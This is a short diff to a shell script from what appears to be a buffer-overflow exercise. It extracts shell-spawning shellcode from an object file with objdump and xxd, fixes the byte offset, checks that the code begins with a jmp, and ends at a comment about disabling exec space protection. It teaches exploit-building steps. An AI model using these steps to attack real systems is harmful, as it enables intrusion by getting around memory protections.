@@ -5,7 +5,9 @@ objdump -d gen_shell.o | sed -n '/needle0/,/needle1/p'
 
 # Shellcode should be 32B long
 echo $((0x21-0x00))
-xxd -s0x00 -l32 -p gen_shell.o shellcode
+xxd -s0x44 -l32 -p gen_shell.o shellcode
+
+# Make sure the shell code starts with a 'jmp 14 <there>' (eb0e)
 cat shellcode
 
 # Disable exec space protection
